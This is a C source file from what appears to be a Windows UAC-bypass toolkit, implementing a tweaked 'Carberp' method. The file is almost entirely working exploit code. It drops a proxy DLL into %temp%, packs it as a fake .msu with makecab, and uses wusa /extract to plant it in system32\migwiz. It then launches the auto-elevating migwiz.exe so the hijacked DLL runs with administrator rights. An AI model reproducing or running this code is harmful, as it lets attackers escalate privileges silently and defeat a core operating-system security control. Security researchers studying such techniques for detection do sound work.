/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       CARBERP.C
*
*  VERSION:     1.20
*
*  DATE:        29 Mar 2015
*
*  Tweaked Carberp method with migwiz as dll hijacking target.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu packet then run migwiz.
*
*/
BOOL ucmWusaMethod(
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	WCHAR szDllFileName[MAX_PATH + 1];
	WCHAR szMsuFileName[MAX_PATH + 1];
	WCHAR szCmd[MAX_PATH * 4];

	RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));

	do {

		if (ExpandEnvironmentStringsW(L"%temp%\\wdscore.dll",
			szDllFileName, MAX_PATH) == 0)
		{
			break;
		}

		if (ExpandEnvironmentStringsW(L"%temp%\\wdscore.msu",
			szMsuFileName, MAX_PATH) == 0)
		{
			break;
		}

		//drop proxy dll
		if (!supWriteBufferToFile(szDllFileName, ProxyDll, ProxyDllSize)) {
			OutputDebugString(TEXT("[UCM] Failed to drop proxy dll"));
			break;
		}

		//create cab with msu extension
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintfW(szCmd, L" /V1 %ws %ws", szDllFileName, szMsuFileName);
		if (!supRunProcess(L"makecab.exe", szCmd)) {
			OutputDebugString(TEXT("[UCM] Makecab failed"));
			break;
		}

		//
		// Target is migwiz because it has manifest with access = HighestAvailable and 
		// it is vulnerable to delay load dll attack.
		//

		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintfW(szCmd, L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz", szMsuFileName);
		if (!supRunProcess(L"cmd.exe", szCmd)) {
			OutputDebugString(TEXT("[UCM] Wusa failed"));
			break;
		}

		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		if (ExpandEnvironmentStringsW(L"%systemroot%\\system32\\migwiz\\migwiz.exe",
			szCmd, MAX_PATH) == 0)
		{
			break;
		}
		bResult = supRunProcess(szCmd, NULL);

	} while (cond);

	//cleanup
	if (szDllFileName[0] != 0) {
		DeleteFileW(szDllFileName);
	}
	if (szMsuFileName[0] != 0) {
		DeleteFileW(szMsuFileName);
	}

	return bResult;
}
